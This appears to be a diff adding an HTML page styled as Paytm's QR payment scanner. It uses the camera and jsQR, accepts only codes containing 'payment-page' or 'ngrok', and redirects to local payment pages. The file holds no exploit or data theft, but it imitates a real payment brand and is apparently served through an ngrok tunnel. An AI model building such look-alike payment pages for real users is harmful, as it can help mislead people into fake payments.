@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Paytm - Scan QR Code</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #000;
+            min-height: 100vh;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+        }
+
+        #camera-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #000;
+        }
+
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .scanner-frame {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 280px;
+            height: 280px;
+            z-index: 15;
+        }
+
+        .scanner-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00b9f5, #00b9f5, transparent);
+            animation: scan 2s linear infinite;
+            box-shadow: 0 0 10px #00b9f5;
+        }
+
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+
+        .corner {
+            position: absolute;
+            width: 25px;
+            height: 25px;
+            border-color: #00b9f5;
+            border-style: solid;
+        }
+
+        .corner-tl { top: -2px; left: -2px; border-width: 3px 0 0 3px; }
+        .corner-tr { top: -2px; right: -2px; border-width: 3px 3px 0 0; }
+        .corner-bl { bottom: -2px; left: -2px; border-width: 0 0 3px 3px; }
+        .corner-br { bottom: -2px; right: -2px; border-width: 0 3px 3px 0; }
+
+        .scanner-text {
+            position: absolute;
+            bottom: -40px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            font-size: 14px;
+            color: rgba(255,255,255,0.9);
+        }
+
+        .bottom-controls {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0,0,0,0.9);
+            padding: 20px 20px 40px;
+            border-top-left-radius: 25px;
+            border-top-right-radius: 25px;
+            z-index: 20;
+        }
+
+        .control-btn {
+            background: #00b9f5;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 35px;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .control-btn.secondary {
+            background: rgba(255,255,255,0.15);
+            margin-top: 12px;
+        }
+
+        .info-text {
+            text-align: center;
+            font-size: 13px;
+            color: #aaa;
+            margin-top: 15px;
+        }
+
+        .loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.9);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            flex-direction: column;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #00b9f5;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            margin-top: 15px;
+            color: white;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 20px;
+            left: 16px;
+            background: rgba(0,0,0,0.5);
+            width: 40px;
+            height: 40px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            z-index: 20;
+        }
+
+        .start-camera-btn {
+            position: absolute;
+            bottom: 200px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #00b9f5;
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 600;
+            z-index: 30;
+            cursor: pointer;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
+            animation: pulse 2s infinite;
+            white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        @keyframes pulse {
+            0% { transform: translateX(-50%) scale(1); }
+            50% { transform: translateX(-50%) scale(1.05); }
+            100% { transform: translateX(-50%) scale(1); }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* QR Icon SVG */
+        .qr-icon {
+            width: 24px;
+            height: 24px;
+        }
+    </style>
+</head>
+<body>
+    <div id="camera-container" class="hidden">
+        <video id="video" autoplay playsinline muted></video>
+    </div>
+
+    <button class="back-btn" onclick="window.location.href='/'">←</button>
+
+    <div id="scannerFrame" class="scanner-frame hidden">
+        <div class="scanner-line"></div>
+        <div class="corner corner-tl"></div>
+        <div class="corner corner-tr"></div>
+        <div class="corner corner-bl"></div>
+        <div class="corner corner-br"></div>
+        <div class="scanner-text">Align QR code within the scanner</div>
+    </div>
+
+    <div id="bottomControls" class="bottom-controls hidden">
+        <button class="control-btn" onclick="manualEntry()">
+            <span>📱</span> Enter Mobile Number to Pay
+        </button>
+        <div class="info-text">
+            Scan QR code to pay
+        </div>
+    </div>
+
+    <div id="loading" class="loading">
+        <div class="spinner"></div>
+        <div class="loading-text">Processing QR Code...</div>
+    </div>
+
+    <button id="startCameraBtn" class="start-camera-btn" onclick="startCamera()">
+        <svg class="qr-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+            <circle cx="8.5" cy="8.5" r="1.5" fill="white"></circle>
+            <polyline points="21 15 16 10 5 21"></polyline>
+        </svg>
+        Start Camera
+    </button>
+
+    <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
+
+    <script>
+        let video = document.getElementById('video');
+        let stream = null;
+        let scanning = false;
+        let animationId = null;
+
+        async function startCamera() {
+            document.getElementById('startCameraBtn').style.display = 'none';
+            document.getElementById('camera-container').classList.remove('hidden');
+            document.getElementById('scannerFrame').classList.remove('hidden');
+            document.getElementById('bottomControls').classList.remove('hidden');
+            
+            try {
+                const constraints = {
+                    video: { facingMode: { exact: 'environment' } }
+                };
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                video.setAttribute('playsinline', true);
+                await video.play();
+                
+                scanning = true;
+                requestAnimationFrame(tick);
+                
+            } catch (err) {
+                console.error("Camera error:", err);
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    video.srcObject = stream;
+                    video.setAttribute('playsinline', true);
+                    await video.play();
+                    scanning = true;
+                    requestAnimationFrame(tick);
+                } catch (err2) {
+                    alert("Camera access denied. Please:\n1. Tap lock icon in address bar\n2. Allow camera\n3. Refresh");
+                    window.location.href = '/';
+                }
+            }
+        }
+
+        function tick() {
+            if (!scanning) return;
+            
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                
+                const code = jsQR(imageData.data, canvas.width, canvas.height, {
+                    inversionAttempts: "dontInvert",
+                });
+                
+                if (code && code.data) {
+                    console.log("QR detected:", code.data);
+                    if (code.data.includes('payment-page') || code.data.includes('ngrok')) {
+                        onQRCodeDetected();
+                    }
+                }
+            }
+            
+            animationId = requestAnimationFrame(tick);
+        }
+
+        function onQRCodeDetected() {
+            if (!scanning) return;
+            scanning = false;
+            
+            if (animationId) cancelAnimationFrame(animationId);
+            if (stream) stream.getTracks().forEach(track => track.stop());
+            
+            document.getElementById('loading').style.display = 'flex';
+            
+            setTimeout(() => {
+                window.location.href = '/scan-complete';
+            }, 1000);
+        }
+
+        function manualEntry() {
+            const mobile = prompt("Enter mobile number to pay:");
+            if (mobile && mobile.length === 10) {
+                window.location.href = '/payment-page';
+            } else {
+                alert("Please enter a valid 10-digit number");
+            }
+        }
+
+        window.addEventListener('beforeunload', () => {
+            if (stream) stream.getTracks().forEach(track => track.stop());
+            if (animationId) cancelAnimationFrame(animationId);
+        });
+    </script>
+</body>
+</html>
